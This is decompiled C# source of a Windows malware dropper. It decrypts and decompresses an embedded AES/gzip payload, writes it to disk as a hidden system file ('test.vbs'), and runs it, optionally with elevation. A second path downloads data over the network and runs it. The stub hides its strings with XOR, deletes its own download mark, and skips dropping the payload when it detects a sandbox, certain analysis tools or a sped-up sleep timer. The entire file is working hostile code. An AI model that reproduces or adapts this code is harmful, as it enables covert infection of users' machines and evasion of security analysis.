using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal class Class0
{
	private static object[] object_0 = new object[1]
	{
		new Class1
		{
			string_0 = smethod_3("\v\u007fnx\u007f%}ix"),
			bool_0 = true,
			bool_1 = true,
			bool_2 = true,
			int_0 = 1,
			int_1 = 1,
			bool_3 = false,
			string_1 = smethod_3("Z"),
			bool_4 = true,
			bool_5 = true,
			bool_6 = true,
			bool_7 = true,
			byte_0 = new byte[3360]
			{
				151, 143, 162, 242, 246, 83, 69, 67, 227, 214,
				53, 111, 169, 137, 203, 236, 208, 13, 249, 57,
				120, 50, 14, 235, 119, 43, 198, 161, 203, 61,
				222, 140, 167, 43, 181, 32, 246, 251, 203, 17,
				78, 152, 38, 70, 163, 250, 27, 179, 144, 84,
				37, 111, 246, 206, 216, 230, 178, 12, 218, 46,
				121, 95, 172, 205, 175, 111, 160, 213, 85, 255,
				225, 79, 54, 152, 197, 29, 53, 199, 170, 166,
				157, 189, 191, 93, 22, 129, 55, 1, 50, 220,
				134, 82, 89, 9, 251, 232, 183, 212, 45, 226,
				160, 70, 114, 103, 13, 91, 31, 144, 9, 238,
				47, 129, 169, 238, 121, 211, 9, 225, 184, 185,
				235, 234, 233, 3, 55, 22, 36, 146, 119, 41,
				53, 245, 202, 70, 62, 76, 145, 202, 59, 181,
				44, 141, 164, 203, 95, 34, 207, 165, 4, 2,
				146, 205, 202, 188, 225, 97, 198, 32, 108, 13,
				51, 225, 8, 61, 33, 192, 169, 85, 220, 65,
				102, 45, 159, 93, 224, 55, 172, 92, 216, 39,
				63, 68, 85, 125, 90, 217, 241, 244, 57, 58,
				123, 170, 42, 145, 114, 50, 186, 209, 181, 188,
				238, 119, 216, 128, 74, 184, 24, 166, 115, 74,
				81, 158, 254, 184, 190, 5, 93, 234, 111, 34,
				3, 193, 44, 11, 11, 13, 0, 129, 53, 224,
				51, 145, 161, 65, 224, 183, 96, 215, 121, 174,
				119, 188, 229, 54, 78, 130, 179, 155, 109, 2,
				26, 255, 147, 104, 64, 119, 210, 40, 154, 147,
				31, 178, 226, 191, 112, 235, 91, 30, 27, 17,
				61, 248, 104, 103, 79, 214, 97, 74, 21, 183,
				31, 92, 161, 155, 114, 120, 128, 39, 154, 101,
				186, 124, 169, 216, 134, 135, 197, 119, 231, 86,
				194, 70, 133, 225, 216, 243, 116, 104, 80, 222,
				233, 109, 147, 96, 91, 27, 3, 228, 49, 18,
				56, 144, 239, 241, 180, 10, 208, 91, 11, 145,
				229, 5, 50, 135, 207, 165, 217, 126, 121, 214,
				200, 171, 224, 171, 241, 255, 5, 124, 112, 183,
				162, 151, 154, 173, 33, 235, 115, 146, 24, 33,
				18, 186, 246, 180, 66, 103, 238, 199, 198, 204,
				62, 208, 41, 236, 94, 125, 59, 245, 215, 254,
				199, 215, 63, 131, 40, 61, 11, 148, 64, 173,
				211, 49, 141, 137, 134, 82, 221, 150, 167, 15,
				149, 51, 153, 121, 61, 163, 251, 246, 48, 93,
				117, 239, 93, 198, 84, 114, 24, 43, 140, 47,
				75, 16, 106, 222, 61, 193, 133, 81, 176, 249,
				100, 112, 40, 133, 192, 198, 40, 182, 181, 60,
				174, 94, 2, 110, 16, 200, 242, 183, 232, 128,
				64, 209, 164, 118, 236, 11, 27, 172, 57, 131,
				66, 48, 95, 22, 205, 194, 5, 1, 92, 19,
				225, 189, 183, 105, 93, 93, 246, 231, 113, 225,
				34, 157, 229, 167, 163, 143, 217, 136, 3, 192,
				191, 35, 252, 210, 253, 200, 143, 95, 100, 181,
				223, 189, 185, 155, 30, 96, 217, 165, 231, 194,
				75, 92, 73, 112, 165, 171, 252, 88, 83, 241,
				85, 99, 51, 58, 193, 211, 29, 234, 131, 114,
				45, 20, 14, 38, 109, 36, 246, 41, 96, 193,
				196, 3, 96, 171, 21, 191, 145, 88, 56, 165,
				224, 65, 45, 9, 199, 35, 71, 162, 220, 183,
				92, 137, 213, 128, 236, 163, 51, 26, 116, 252,
				139, 76, 90, 43, 8, 237, 62, 78, 60, 205,
				40, 222, 65, 153, 170, 109, 87, 4, 7, 160,
				92, 60, 118, 91, 235, 39, 150, 26, 98, 17,
				235, 198, 35, 178, 76, 99, 219, 200, 186, 214,
				102, 244, 162, 105, 174, 145, 59, 5, 208, 207,
				104, 201, 167, 84, 135, 10, 166, 246, 7, 227,
				138, 26, 40, 156, 244, 18, 116, 117, 168, 234,
				33, 94, 24, 47, 204, 244, 43, 73, 99, 10,
				202, 107, 45, 222, 177, 37, 168, 90, 178, 75,
				221, 214, 129, 168, 240, 224, 232, 139, 65, 177,
				197, 180, 129, 46, 207, 177, 2, 26, 91, 122,
				92, 79, 14, 27, 238, 151, 88, 132, 222, 53,
				238, 122, 44, 191, 121, 103, 175, 126, 50, 87,
				38, 84, 202, 131, 105, 98, 10, 64, 22, 224,
				40, 218, 22, 4, 127, 45, 59, 154, 68, 35,
				51, 240, 208, 148, 143, 224, 186, 241, 157, 233,
				169, 34, 162, 172, 115, 106, 55, 167, 33, 59,
				132, 50, 199, 127, 185, 93, 130, 249, 71, 207,
				146, 153, 184, 118, 194, 178, 131, 232, 42, 12,
				116, 187, 203, 215, 69, 248, 34, 159, 184, 169,
				17, 144, 143, 165, 104, 52, 24, 79, 241, 196,
				190, 66, 186, 94, 177, 178, 238, 50, 142, 161,
				183, 26, 36, 53, 119, 208, 242, 4, 44, 239,
				119, 15, 163, 148, 236, 176, 113, 128, 48, 20,
				234, 43, 109, 159, 124, 209, 136, 54, 213, 232,
				150, 46, 5, 233, 252, 241, 244, 87, 13, 178,
				220, 160, 156, 184, 179, 138, 148, 221, 179, 57,
				48, 46, 149, 18, 205, 82, 114, 175, 2, 22,
				154, 80, 223, 98, 28, 189, 213, 181, 105, 175,
				255, 151, 85, 156, 226, 81, 73, 178, 13, 43,
				145, 59, 86, 95, 2, 8, 127, 181, 23, 128,
				21, 92, 56, 187, 137, 153, 202, 161, 175, 70,
				149, 200, 46, 245, 5, 208, 72, 40, 164, 60,
				33, 83, 178, 137, 97, 63, 170, 33, 76, 2,
				63, 98, 217, 90, 97, 85, 210, 84, 20, 101,
				27, 23, 14, 133, 40, 61, 233, 201, 57, 187,
				230, 46, 234, 220, 188, 34, 175, 34, 182, 137,
				41, 154, 253, 144, 55, 140, 40, 76, 234, 184,
				118, 180, 229, 165, 160, 52, 129, 25, 214, 87,
				151, 138, 251, 125, 3, 182, 23, 133, 241, 17,
				4, 127, 96, 250, 134, 223, 72, 40, 103, 84,
				76, 125, 181, 71, 114, 56, 68, 116, 49, 13,
				109, 77, 47, 30, 37, 187, 56, 173, 124, 169,
				183, 74, 169, 219, 205, 222, 157, 90, 94, 49,
				12, 183, 139, 149, 193, 161, 83, 227, 218, 9,
				131, 120, 197, 215, 63, 111, 102, 255, 87, 192,
				74, 187, 254, 102, 183, 175, 26, 227, 147, 206,
				230, 146, 172, 155, 36, 103, 183, 215, 158, 147,
				59, 55, 65, 10, 35, 215, 126, 75, 166, 64,
				188, 82, 217, 231, 212, 31, 175, 101, 50, 248,
				38, 255, 22, 251, 105, 76, 25, 219, 250, 2,
				246, 220, 77, 225, 160, 245, 126, 86, 246, 246,
				218, 178, 188, 140, 217, 50, 15, 148, 188, 208,
				244, 138, 233, 180, 176, 241, 213, 233, 225, 153,
				83, 31, 53, 27, 196, 229, 142, 209, 137, 213,
				166, 242, 158, 215, 218, 79, 193, 167, 198, 164,
				27, 206, 211, 156, 182, 91, 24, 1, 193, 219,
				210, 111, 163, 71, 37, 185, 108, 155, 3, 148,
				12, 49, 160, 193, 93, 101, 102, 59, 49, 203,
				83, 157, 14, 158, 142, 175, 234, 86, 120, 4,
				105, 110, 92, 60, 65, 33, 169, 71, 106, 141,
				43, 63, 0, 210, 136, 162, 220, 90, 82, 254,
				3, 128, 221, 105, 158, 112, 82, 220, 227, 134,
				105, 86, 87, 137, 78, 170, 63, 58, 141, 169,
				88, 40, 13, 13, 177, 45, 151, 240, 62, 219,
				59, 60, 160, 139, 119, 99, 163, 179, 69, 79,
				219, 98, 65, 154, 128, 34, 3, 31, 119, 247,
				62, 50, 76, 216, 59, 54, 133, 219, 159, 78,
				85, 31, 82, 135, 141, 233, 166, 173, 219, 79,
				1, 38, 214, 121, 113, 28, 16, 130, 76, 226,
				38, 201, 249, 70, 23, 71, 8, 72, 195, 18,
				121, 158, 15, 70, 13, 111, 21, 60, 86, 182,
				112, 42, 19, 36, 93, 10, 244, 122, 21, 194,
				119, 119, 208, 6, 222, 189, 132, 96, 47, 132,
				15, 43, 102, 64, 125, 19, 46, 4, 55, 227,
				121, 220, 96, 227, 34, 109, 110, 93, 3, 117,
				18, 162, 245, 156, 28, 162, 178, 175, 176, 225,
				194, 43, 122, 177, 222, 232, 165, 116, 129, 36,
				190, 103, 114, 49, 195, 99, 93, 47, 0, 248,
				92, 27, 4, 169, 100, 112, 106, 194, 143, 249,
				113, 234, 80, 43, 240, 162, 125, 57, 159, 2,
				46, 102, 205, 166, 69, 79, 67, 235, 242, 119,
				93, 58, 176, 130, 81, 43, 194, 61, 202, 9,
				114, 221, 210, 152, 168, 62, 244, 46, 112, 60,
				200, 120, 2, 153, 150, 134, 33, 113, 8, 222,
				141, 191, 184, 223, 179, 129, 163, 158, 162, 138,
				202, 173, 234, 152, 169, 100, 68, 115, 255, 120,
				32, 19, 216, 39, 165, 30, 69, 86, 246, 176,
				75, 23, 147, 213, 13, 236, 216, 98, 162, 205,
				167, 13, 100, 94, 201, 198, 18, 51, 253, 213,
				159, 100, 153, 149, 223, 202, 149, 73, 155, 132,
				73, 150, 54, 63, 110, 60, 110, 11, 241, 184,
				231, 67, 182, 150, 27, 31, 77, 83, 232, 159,
				188, 111, 244, 110, 51, 178, 231, 241, 255, 60,
				209, 201, 126, 210, 93, 243, 20, 149, 203, 253,
				223, 86, 33, 184, 198, 230, 136, 156, 68, 37,
				183, 14, 188, 184, 83, 151, 63, 54, 237, 1,
				230, 62, 224, 128, 115, 67, 149, 126, 129, 228,
				52, 193, 43, 63, 180, 231, 59, 204, 29, 131,
				63, 65, 228, 117, 241, 182, 141, 192, 208, 67,
				52, 42, 170, 104, 211, 175, 119, 198, 247, 226,
				171, 180, 37, 252, 211, 221, 84, 4, 226, 1,
				241, 83, 135, 90, 29, 132, 99, 55, 70, 203,
				109, 15, 69, 18, 114, 94, 238, 122, 138, 212,
				2, 233, 7, 181, 78, 20, 132, 191, 47, 197,
				139, 187, 22, 171, 99, 238, 219, 135, 164, 229,
				167, 1, 167, 69, 189, 72, 188, 250, 236, 201,
				184, 240, 213, 200, 66, 184, 131, 61, 121, 11,
				149, 46, 113, 124, 0, 245, 5, 196, 28, 212,
				72, 156, 191, 64, 184, 119, 186, 175, 78, 199,
				188, 111, 44, 117, 97, 194, 53, 86, 224, 59,
				170, 194, 242, 243, 238, 69, 22, 57, 159, 132,
				231, 15, 104, 62, 196, 100, 83, 156, 169, 203,
				50, 7, 234, 40, 254, 215, 74, 155, 68, 210,
				166, 182, 100, 84, 37, 114, 117, 167, 41, 123,
				122, 159, 244, 229, 218, 84, 95, 14, 210, 199,
				219, 244, 81, 128, 79, 250, 155, 109, 47, 45,
				45, 184, 119, 207, 235, 37, 150, 68, 29, 220,
				229, 189, 41, 173, 170, 153, 227, 12, 109, 70,
				147, 90, 155, 53, 81, 25, 95, 96, 69, 228,
				251, 228, 134, 146, 41, 25, 206, 18, 73, 247,
				47, 42, 229, 132, 46, 249, 12, 237, 241, 159,
				144, 135, 178, 99, 160, 129, 216, 168, 242, 55,
				153, 21, 197, 66, 122, 60, 62, 152, 7, 199,
				138, 68, 250, 176, 253, 78, 220, 154, 58, 170,
				68, 33, 208, 122, 93, 55, 93, 223, 177, 221,
				236, 196, 199, 226, 69, 196, 176, 87, 230, 130,
				46, 194, 65, 144, 237, 237, 207, 21, 129, 190,
				205, 12, 230, 195, 78, 8, 75, 55, 36, 77,
				79, 45, 116, 149, 197, 65, 124, 109, 169, 211,
				94, 67, 84, 222, 208, 3, 79, 198, 159, 127,
				117, 113, 60, 101, 140, 93, 235, 117, 34, 76,
				131, 122, 228, 225, 72, 57, 13, 109, 243, 179,
				165, 53, 19, 252, 189, 39, 157, 180, 240, 87,
				159, 190, 92, 192, 232, 170, 148, 75, 242, 70,
				137, 231, 221, 222, 226, 232, 62, 0, 98, 100,
				72, 227, 78, 30, 237, 6, 189, 39, 95, 79,
				207, 36, 249, 153, 55, 147, 140, 3, 2, 3,
				17, 162, 166, 92, 46, 161, 178, 167, 111, 217,
				185, 35, 243, 53, 78, 133, 254, 155, 64, 145,
				131, 69, 134, 74, 153, 242, 210, 207, 137, 23,
				144, 81, 106, 171, 169, 163, 174, 213, 106, 125,
				144, 64, 255, 126, 190, 219, 220, 60, 90, 186,
				104, 165, 108, 113, 44, 79, 53, 14, 188, 123,
				28, 36, 61, 136, 154, 197, 108, 216, 65, 47,
				33, 221, 124, 243, 170, 133, 6, 129, 141, 226,
				8, 40, 21, 158, 56, 49, 147, 104, 99, 69,
				181, 66, 76, 221, 84, 212, 225, 125, 175, 156,
				95, 134, 30, 21, 145, 126, 220, 16, 145, 250,
				73, 228, 151, 201, 106, 190, 4, 145, 32, 16,
				3, 16, 200, 55, 0, 96, 28, 141, 130, 245,
				211, 105, 178, 172, 93, 227, 204, 218, 31, 1,
				96, 137, 203, 238, 204, 10, 2, 140, 90, 216,
				180, 173, 18, 4, 143, 231, 34, 236, 134, 182,
				1, 165, 235, 87, 163, 43, 101, 150, 48, 221,
				14, 55, 193, 85, 228, 38, 241, 36, 7, 175,
				246, 135, 59, 103, 216, 77, 76, 159, 115, 96,
				41, 39, 4, 138, 148, 58, 175, 127, 66, 138,
				52, 37, 173, 250, 205, 19, 25, 142, 85, 151,
				236, 251, 242, 184, 138, 126, 58, 39, 60, 144,
				87, 121, 154, 136, 55, 167, 36, 178, 41, 5,
				242, 184, 218, 112, 206, 22, 128, 211, 171, 211,
				86, 147, 216, 17, 162, 186, 115, 184, 59, 202,
				160, 163, 242, 214, 82, 2, 1, 86, 177, 182,
				193, 243, 117, 160, 98, 143, 23, 156, 95, 134,
				82, 85, 12, 118, 221, 227, 94, 72, 59, 70,
				179, 59, 93, 14, 18, 47, 208, 131, 169, 58,
				138, 90, 66, 122, 135, 245, 164, 251, 60, 74,
				232, 130, 41, 35, 243, 58, 176, 9, 144, 3,
				213, 110, 232, 109, 68, 103, 26, 61, 26, 60,
				164, 98, 153, 190, 131, 18, 49, 12, 125, 82,
				122, 230, 219, 105, 187, 238, 137, 111, 191, 13,
				121, 68, 40, 102, 82, 27, 65, 7, 27, 70,
				205, 138, 253, 156, 242, 150, 120, 121, 39, 14,
				87, 173, 71, 53, 157, 48, 166, 172, 184, 149,
				24, 216, 62, 117, 6, 28, 29, 24, 220, 230,
				153, 114, 113, 145, 214, 20, 106, 192, 241, 216,
				241, 196, 246, 2, 215, 219, 206, 200, 248, 72,
				54, 47, 206, 72, 16, 15, 145, 242, 42, 10,
				60, 48, 252, 206, 63, 208, 36, 117, 144, 15,
				150, 122, 43, 251, 65, 6, 254, 158, 6, 79,
				188, 39, 207, 46, 150, 21, 181, 67, 160, 139,
				109, 30, 170, 60, 31, 131, 42, 236, 69, 219,
				142, 20, 72, 250, 197, 25, 57, 5, 211, 39,
				86, 34, 239, 173, 237, 230, 142, 102, 119, 205,
				100, 180, 193, 210, 157, 151, 136, 45, 249, 105,
				116, 183, 112, 233, 154, 230, 248, 95, 198, 128,
				221, 115, 155, 65, 25, 171, 207, 36, 160, 173,
				229, 54, 181, 246, 239, 219, 255, 134, 124, 8,
				115, 126, 51, 151, 199, 198, 52, 92, 208, 147,
				199, 99, 151, 244, 137, 220, 82, 48, 194, 129,
				54, 63, 187, 41, 144, 178, 44, 246, 169, 21,
				246, 87, 205, 76, 181, 206, 173, 185, 211, 233,
				23, 38, 79, 137, 127, 131, 75, 144, 102, 45,
				89, 143, 231, 244, 127, 110, 229, 9, 27, 141,
				196, 234, 52, 137, 65, 207, 12, 168, 127, 3,
				21, 133, 28, 47, 20, 151, 241, 35, 134, 247,
				120, 156, 70, 77, 89, 158, 253, 32, 75, 164,
				19, 224, 229, 140, 150, 238, 115, 44, 88, 96,
				87, 79, 45, 79, 94, 202, 159, 34, 148, 50,
				38, 233, 253, 183, 85, 161, 241, 217, 120, 111,
				116, 3, 61, 41, 219, 100, 28, 60, 216, 214,
				166, 23, 92, 171, 52, 39, 18, 118, 211, 221,
				155, 26, 142, 248, 112, 138, 167, 193, 172, 112,
				165, 78, 58, 223, 183, 48, 59, 50, 69, 74,
				228, 163, 242, 0, 62, 13, 253, 100, 197, 141,
				253, 69, 252, 8, 69, 195, 186, 245, 6, 43,
				241, 114, 111, 51, 71, 174, 110, 40, 62, 228,
				213, 83, 107, 182, 228, 60, 141, 168, 89, 225,
				130, 46, 244, 214, 115, 194, 11, 221, 141, 95,
				235, 133, 157, 76, 230, 104, 112, 212, 172, 50,
				72, 0, 232, 217, 150, 178, 19, 15, 194, 183,
				210, 142, 144, 44, 85, 190, 248, 210, 36, 165,
				28, 91, 38, 109, 123, 207, 131, 46, 210, 149,
				242, 135, 210, 140, 189, 84, 225, 203, 118, 216,
				64, 55, 16, 178, 241, 31, 235, 214, 175, 251,
				92, 101, 208, 144, 225, 148, 221, 206, 187, 162,
				25, 195, 170, 160, 0, 254, 82, 118, 191, 57,
				106, 109, 74, 224, 20, 125, 237, 83, 171, 34,
				225, 88, 4, 206, 92, 151, 200, 245, 44, 100,
				131, 8, 37, 114, 127, 122, 141, 121, 17, 34,
				128, 195, 185, 172, 221, 179, 31, 103, 95, 236,
				33, 42, 32, 185, 212, 244, 2, 127, 12, 252,
				142, 55, 106, 58, 183, 159, 46, 209, 56, 42,
				136, 86, 129, 233, 142, 103, 231, 227, 188, 223,
				165, 134, 105, 170, 80, 169, 133, 80, 189, 85,
				116, 178, 221, 29, 82, 234, 170, 237, 122, 168,
				215, 56, 47, 8, 96, 181, 140, 201, 25, 81,
				87, 17, 2, 138, 14, 119, 204, 100, 6, 186,
				217, 209, 110, 120, 104, 129, 120, 53, 125, 216,
				245, 91, 186, 221, 179, 119, 215, 73, 206, 93,
				138, 23, 62, 76, 49, 101, 114, 153, 20, 27,
				182, 120, 229, 120, 142, 82, 168, 112, 151, 153,
				223, 135, 247, 44, 67, 97, 56, 129, 182, 197,
				250, 38, 198, 105, 77, 130, 60, 135, 194, 133,
				171, 190, 24, 152, 211, 165, 174, 134, 77, 155,
				91, 13, 242, 235, 168, 225, 0, 188, 87, 96,
				167, 164, 47, 114, 129, 199, 52, 148, 137, 132,
				124, 192, 203, 255, 1, 221, 35, 159, 135, 43,
				26, 201, 165, 220, 103, 171, 152, 115, 199, 245,
				181, 240, 115, 102, 167, 56, 47, 254, 58, 19,
				198, 71, 223, 129, 204, 108, 211, 200, 183, 153,
				127, 72, 146, 34, 134, 123, 158, 91, 161, 16,
				179, 168, 58, 2, 59, 55, 231, 94, 4, 39,
				224, 234, 66, 159, 101, 118, 86, 87, 96, 180,
				36, 194, 53, 187, 53, 49, 166, 90, 58, 79,
				204, 66, 166, 147, 198, 35, 190, 23, 127, 121,
				171, 171, 90, 14, 16, 102, 209, 101, 25, 181,
				163, 178, 74, 183, 99, 180, 117, 26, 50, 247,
				136, 97, 205, 102, 246, 17, 134, 66, 152, 179,
				201, 246, 224, 100, 164, 61, 92, 108, 153, 78,
				223, 238, 36, 59, 40, 156, 188, 108, 247, 214,
				253, 240, 228, 33, 126, 216, 46, 202, 7, 208,
				247, 93, 191, 208, 134, 229, 123, 14, 210, 156,
				228, 79, 232, 88, 194, 39, 176, 147, 22, 74,
				124, 225, 15, 124, 154, 172, 78, 240, 197, 85,
				155, 74, 170, 209, 74, 219, 90, 139, 213, 107,
				187, 187, 214, 96, 137, 70, 154, 174, 217, 197,
				31, 73, 2, 199, 55, 254, 24, 165, 14, 123,
				247, 35, 200, 183, 66, 123, 103, 182, 81, 130,
				167, 162, 135, 59, 255, 162, 142, 221, 113, 116,
				162, 99, 160, 176, 216, 123, 33, 36, 102, 192,
				52, 22, 27, 80, 165, 159, 174, 251, 179, 237,
				11, 85, 111, 110, 205, 196, 127, 187, 140, 239,
				7, 229, 225, 213, 215, 83, 26, 137, 54, 188,
				52, 78, 125, 9, 244, 118, 82, 203, 121, 167,
				134, 46, 132, 175, 199, 125, 209, 94, 235, 155,
				62, 232, 35, 113, 88, 202, 22, 152, 32, 211,
				47, 68, 53, 192, 89, 190, 101, 16, 165, 75,
				147, 128, 95, 89, 221, 104, 79, 212, 14, 72,
				103, 179, 101, 99, 216, 110, 79, 140, 65, 88,
				202, 252, 147, 248, 236, 140, 47, 60, 118, 155,
				112, 26, 89, 234, 118, 15, 213, 113, 27, 78,
				7, 18, 123, 170, 102, 196, 254, 183, 69, 71,
				103, 151, 156, 248, 241, 194, 96, 52, 113, 166,
				122, 142, 10, 70, 59, 30, 169, 167, 123, 71,
				11, 114, 17, 193, 242, 18, 234, 37, 53, 215,
				87, 151, 75, 25, 232, 107, 181, 84, 141, 212,
				159, 67, 81, 110, 12, 48, 152, 35, 215, 29
			}
		}
	};

	private static void Main()
	{
		//IL_028a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0291: Unknown result type (might be due to invalid IL or missing references)
		//IL_0296: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			DeleteFile(Assembly.GetExecutingAssembly().Location + smethod_3("ïÕµ\u0080\u0081\u008aÁ¦\u008b\u008a\u0081\u009b\u0086\u0089\u0086\u008a\u009d"));
		}
		catch
		{
		}
		bool flag = GetModuleHandle(smethod_3("\u0005Vgl`Aii")) != IntPtr.Zero;
		bool flag2 = Process.GetProcessesByName(smethod_3("a6\b\u0013\u0004\u0012\t\0\u0013\n")).Length > 0 || Process.GetProcesses().Any(delegate(Process process)
		{
			try
			{
				return string.Compare(process.MainWindowTitle, smethod_3("\u0003Wkf#Tjqfpkbqh#Mfwtlqh#Bmbozyfq"), ignoreCase: true) == 0;
			}
			catch
			{
				return false;
			}
		});
		bool flag3 = Process.GetProcesses().Any(delegate(Process process)
		{
			try
			{
				return process.MainWindowTitle.ToLower().Contains(smethod_3("\u009bëéôøþèè»öôõòïôé»¶"));
			}
			catch
			{
				return false;
			}
		});
		int tickCount = Environment.TickCount;
		DateTime now = DateTime.Now;
		Thread.Sleep(500);
		int tickCount2 = Environment.TickCount;
		DateTime now2 = DateTime.Now;
		bool flag4 = tickCount2 - tickCount < 450 || now2 - now < TimeSpan.FromMilliseconds(450.0);
		object[] array = object_0;
		foreach (object obj2 in array)
		{
			try
			{
				if (obj2 is Class1)
				{
					Class1 @class = (Class1)obj2;
					if ((!@class.bool_4 || !flag) && (!@class.bool_5 || !flag2) && (!@class.bool_6 || !flag3) && (!@class.bool_7 || !flag4))
					{
						byte[] byte_ = @class.byte_0;
						if (@class.bool_1)
						{
							byte_ = smethod_2(byte_);
						}
						if (@class.bool_0)
						{
							byte_ = smethod_1(byte_);
						}
						smethod_0(@class.string_0, @class.bool_2, @class.int_0, @class.int_1, @class.bool_3, @class.string_1, byte_);
					}
				}
				else if (obj2 is Class2)
				{
					Class2 class2 = (Class2)obj2;
					if ((!class2.bool_2 || !flag) && (!class2.bool_3 || !flag2) && (!class2.bool_4 || !flag3) && (!class2.bool_5 || !flag4))
					{
						smethod_0(class2.string_1, class2.bool_0, class2.int_0, class2.int_1, class2.bool_1, class2.string_2, new WebClient().DownloadData(class2.string_0));
					}
				}
				else if (obj2 is Class3)
				{
					Class3 class3 = (Class3)obj2;
					MessageBox.Show(class3.string_1, class3.string_0, class3.messageBoxButtons_0, class3.messageBoxIcon_0);
				}
			}
			catch
			{
			}
		}
	}

	private static void smethod_0(string string_0, bool bool_0, int int_0, int int_1, bool bool_1, string string_1, byte[] byte_0)
	{
		string path;
		switch (int_0)
		{
		default:
			return;
		case 1:
			path = Path.GetTempPath();
			break;
		case 2:
			path = Registry.GetValue(smethod_3("\nBAOSUI_XXOD^U_YOXVYel~}kxoVGcixeyel~V]cdne}yVI\u007fxxod~\\oxycedVOrzfexoxVYboff*Lefnoxy"), smethod_3("\u000eu=9:JK<7>#?<=H#:;8;#7?8:#=7M:7<;K:89Ls"), null) as string;
			break;
		case 3:
			path = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
			break;
		case 4:
			path = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
			break;
		case 5:
			path = AppDomain.CurrentDomain.BaseDirectory;
			break;
		}
		string_0 = Path.Combine(path, string_0);
		File.Delete(string_0);
		File.WriteAllBytes(string_0, byte_0);
		if (bool_0)
		{
			new FileInfo(string_0).Attributes |= FileAttributes.Hidden | FileAttributes.System;
		}
		if (int_1 < 1)
		{
			return;
		}
		ProcessStartInfo processStartInfo = new ProcessStartInfo(string_0, string_1);
		if (bool_1)
		{
			processStartInfo.Verb = smethod_3("±ÃÄßÐÂ");
		}
		Process process = null;
		try
		{
			process = Process.Start(processStartInfo);
		}
		catch
		{
		}
		if (int_1 >= 2)
		{
			process?.WaitForExit();
			if (int_1 >= 3)
			{
				File.Delete(string_0);
			}
		}
	}

	private static byte[] smethod_1(byte[] byte_0)
	{
		MemoryStream memoryStream = new MemoryStream();
		int num = BitConverter.ToInt32(byte_0, 0);
		memoryStream.Write(byte_0, 4, byte_0.Length - 4);
		byte[] array = new byte[num];
		memoryStream.Position = 0L;
		new GZipStream(memoryStream, CompressionMode.Decompress).Read(array, 0, array.Length);
		return array;
	}

	private static byte[] smethod_2(byte[] byte_0)
	{
		byte[] array = new byte[16];
		Buffer.BlockCopy(byte_0, 0, array, 0, 16);
		Rijndael rijndael = Rijndael.Create();
		byte[] array4 = (rijndael.IV = (rijndael.Key = array));
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write);
		cryptoStream.Write(byte_0, 16, byte_0.Length - 16);
		cryptoStream.Close();
		return memoryStream.ToArray();
	}

	private static string smethod_3(string string_0)
	{
		return new string((from c in string_0.Substring(1)
			select (char)(c ^ (byte)string_0[0])).ToArray());
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool DeleteFile(string string_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string string_0);
}
